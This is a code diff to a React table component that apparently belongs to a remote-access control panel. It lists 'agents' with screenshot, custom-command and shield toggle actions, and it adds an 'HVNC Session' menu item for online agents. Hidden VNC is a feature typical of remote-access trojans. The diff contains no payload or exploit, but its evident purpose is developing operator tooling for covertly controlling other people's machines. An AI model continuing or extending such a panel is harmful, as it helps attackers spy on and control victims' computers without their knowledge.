@@ -2,15 +2,16 @@ import React, { useState, useEffect } from 'react';
 import { Agent } from '../types';
 import toast from 'react-hot-toast';
 import { API_URL } from '../config';
-import { FiMoreVertical, FiShield, FiShieldOff, FiCamera, FiTerminal, FiInfo, FiPower, FiRefreshCw } from 'react-icons/fi';
+import { FiMoreVertical, FiShield, FiShieldOff, FiCamera, FiTerminal, FiInfo, FiPower, FiRefreshCw, FiMonitor } from 'react-icons/fi';
 
 interface UserTableProps {
   users: Agent[];
   onViewUser: (user: Agent) => void;
   onViewTasks: (user: Agent) => void;
+  onOpenHvnc?: (user: Agent) => void;
 }
 
-const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks }) => {
+const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks, onOpenHvnc }) => {
   const [selectedUser, setSelectedUser] = useState<Agent | null>(null);
   const [showCustomCommand, setShowCustomCommand] = useState<Agent | null>(null);
   const [customCommand, setCustomCommand] = useState('');
@@ -153,6 +154,12 @@ const UserTable: React.FC<UserTableProps> = ({ users, onViewUser, onViewTasks })
               <FiCamera className="w-4 h-4 mr-2" />
               Screenshot
             </div>
+              {user.features?.hvnc && user.status === 'online' && (
+                <div className="premium-dropdown-item" onClick={() => onOpenHvnc?.(user)}>
+                  <FiMonitor className="w-4 h-4 mr-2" />
+                  HVNC Session
+                </div>
+              )}
             <div className="premium-dropdown-item" onClick={() => onViewUser(user)}>
               <FiInfo className="w-4 h-4 mr-2" />
               View Details
